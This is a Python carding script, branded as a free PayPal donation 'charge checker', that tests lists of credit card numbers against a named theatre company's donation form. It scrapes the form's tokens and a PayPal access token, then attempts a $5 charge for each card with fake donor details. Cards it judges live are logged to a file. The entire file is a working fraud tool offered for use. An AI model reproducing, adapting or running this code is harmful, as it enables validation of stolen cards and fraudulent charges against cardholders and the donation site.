#================================
#FREE PAYPAL DONATE CHARGE CHECKER BY @MAST4RCARD

#DONT FORGET JOİN MY CHANNEL @FTX_COURSE

#================================
import base64
import requests
import re
import time
import os
import random
from colorama import init, Fore, Style
init(autoreset=True)


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + Style.BRIGHT + """
╔══════════════════════════════════════════════════════╗
║               FREE PAYPAL CHARGE TOOL                ║
║           PayPal Commerce | CNN GATS       ║
║                  coded by @Mast4rcard               ║
╚══════════════════════════════════════════════════════╝
""")

def print_status(msg, status="info"):
    if status == "success":
        print(Fore.GREEN + "[+] " + msg)
    elif status == "live":
        print(Fore.YELLOW + Style.BRIGHT + "[LIVE] " + msg)
    elif status == "die":
        print(Fore.RED + "[DIE] " + msg)
    elif status == "error":
        print(Fore.MAGENTA + "[!] " + msg)
    else:
        print(Fore.CYAN + "[*] " + msg)


def random_ua():
    agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    ]
    return random.choice(agents) + " (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"


class AtlanticGateway:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"user-agent": random_ua()})

    def fetch_tokens(self):
        try:
            print_status("Gateways Connect...", "info")
            r = self.session.get("https://atlanticcitytheatrecompany.com/donations/donate/", timeout=20)
            if "donate" not in r.text.lower():
                print_status("Site yanıt vermiyor! Cloudflare olabilir.", "error")
                return None

            prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
            form_id = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
            form_hash = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
            enc_token = re.search(r'"data-client-token":"(.*?)"', r.text).group(1)

            decoded = base64.b64decode(enc_token).decode('utf-8')
            access_token = re.search(r'"accessToken":"(.*?)"', decoded).group(1)

            print_status("TOKENS DONE", "success")
            return {
                "prefix": prefix,
                "form_id": form_id,
                "form_hash": form_hash,
                "access_token": access_token
            }
        except Exception as e:
            print_status(f"Token alınırken hata: {str(e)}", "error")
            return None

    def check(self, card_data, tokens):
        try:
            number, month, year, cvv = card_data.strip().split('|')
            clean_number = number.replace(" ", "")

      
            files = {
                'give-form-id-prefix': (None, tokens['prefix']),
                'give-form-id': (None, tokens['form_id']),
                'give-form-hash': (None, tokens['form_hash']),
                'give-price-id': (None, 'custom'),
                'give-amount': (None, '5.00'),
                'payment-mode': (None, 'paypal-commerce'),
                'card_name': (None, 'John Doe'),
                'give_email': (None, f"test{random.randint(1000,9999)}@gmail.com"),
                'give_first': (None, 'Test'),
                'give_last': (None, 'User'),
            }

            params = {'action': 'give_paypal_commerce_create_order'}
            self.session.post("https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php", params=params, files=files, timeout=15)


            headers = {
                'authorization': f'Bearer {tokens["access_token"]}',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': random_ua(),
                'paypal-client-metadata-id': ''.join(random.choices('0123456789abcdef', k=32)),
            }

            payload = {
                "payment_source": {
                    "card": {
                        "number": clean_number,
                        "expiry": f"{year}-{month.zfill(2)}",
                        "security_code": cvv,
                        "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
                    }
                }
            }

            resp = self.session.post(
                "https://cors.api.paypal.com/v2/checkout/orders/4TP215160W655233Y/confirm-payment-source",
                json=payload,
                headers=headers,
                timeout=20
            )

            result = resp.json()
            
            message = "Unknown Response"
            if "message" in result:
                message = result["message"]
            elif "details" in result and len(result["details"]) > 0:
                message = result["details"][0].get("description", "No description")
            elif "name" in result:
                message = result["name"]

            full_result = f"{clean_number}|{month}|{year}|{cvv} => {message}"

            live_keywords = ["insufficient", "approved", "success", "charged", "authorized", "settled"]
            if any(kw in message.lower() for kw in live_keywords):
                print(Fore.YELLOW + Style.BRIGHT + f"[LIVE] {full_result}")
                with open("live.txt", "a", encoding="utf-8") as f:
                    f.write(full_result + "\n")
                return "live"
            else:
                print(Fore.RED + f"[DIE] {full_result}")
                return "die"

        except requests.exceptions.RequestException as e:
            error_msg = f"{card_data.strip()} => Bağlantı Hatası"
            print(Fore.MAGENTA + f"[ERROR] {error_msg}")
            return "error"
        except Exception as e:
            error_msg = f"{card_data.strip()} => Hata: {str(e)[:50]}"
            print(Fore.MAGENTA + f"[ERROR] {error_msg}")
            return "error"


def main():
    banner()
    print_status("Paypal Auto Donate Gate", "info")
    
    txt_path = input(Fore.CYAN + "\nPls Enter Your Txt File Name (example ftx.txt): ").strip()
    
    if not txt_path.endswith('.txt'):
        txt_path += '.txt'
    
    if not os.path.exists(txt_path):
        print_status("file not.found! ", "error")
        time.sleep(3)
        return

    print_status(f"{txt_path} File Found waiting", "success")
    with open(txt_path, 'r', encoding='utf-8') as f:
        total_cards = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    if len(total_cards) == 0:
        print_status("Valid card error in txt!", "error")
        return

    print_status(f"Total {len(total_cards)} Card Dowload.", "info")
    delay = input(Fore.CYAN + "Enter Click").strip()
    delay = int(delay) if delay.isdigit() else 2

    gateway = AtlanticGateway()
    tokens = gateway.fetch_tokens()
    if not tokens:
        return

    print_status("Check Started", "success")
    time.sleep(2)

    live_count = die_count = error_count = 0

    for i, card in enumerate(total_cards, 1):
        print(f"\n{Fore.WHITE}[{i}/{len(total_cards)}] Checking..")
        result = gateway.check(card, tokens)
        
        if result == "live":
            live_count += 1
        elif result == "die":
            die_count += 1
        else:
            error_count += 1

        time.sleep(delay)

    # Sonuç
    print(Fore.CYAN + Style.BRIGHT + f"""
══════════════════════════════════════
    CHECK FİNSH!
    LIVE : {live_count}
    DIE  : {die_count}
    EROR : {error_count}
    TOTAL: {len(total_cards)}
══════════════════════════════════════
    """)

    input(Fore.GREEN + "Press ENTER to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\nChecker Stop.")